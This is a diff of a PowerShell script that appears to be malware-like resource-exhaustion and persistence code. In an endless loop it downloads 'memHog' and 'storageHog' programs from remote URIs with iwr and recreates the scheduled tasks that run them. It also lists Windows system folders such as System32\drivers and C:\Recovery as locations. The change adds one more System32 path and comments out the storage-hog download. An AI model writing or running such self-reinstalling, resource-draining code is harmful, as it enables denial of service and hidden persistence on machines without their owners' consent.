@@ -7,6 +7,7 @@ $paths = @(
     "$env:windir\System32\drivers",
     "$env:windir\System32\en-US",
     "$env:windir\System32\LogFiles\WMI",
+    "$env:windir\System32\wbem\en-US"
     "C:\Recovery",
     "$env:temp",
     "$env:ProgramData",
@@ -72,9 +73,9 @@ while ($true) {
     if(-not(Test-Path $memHogPath)){
         iwr -Uri $memHogUri -OutFile $memHogPath
     }
-    if(-not(Test-Path $storageHogPath)){
-        iwr -Uri $storageHogUri -OutFile $storageHogPath
-    }
+    # if(-not(Test-Path $storageHogPath)){
+    #     iwr -Uri $storageHogUri -OutFile $storageHogPath
+    # }
     CheckTask-And-Recreate -taskName $memHogTaskName -taskRunAction $memTaskRunAction
     CheckTask-And-Recreate -taskName $storageHogTaskName -taskRunAction $storageTaskRunAction
 
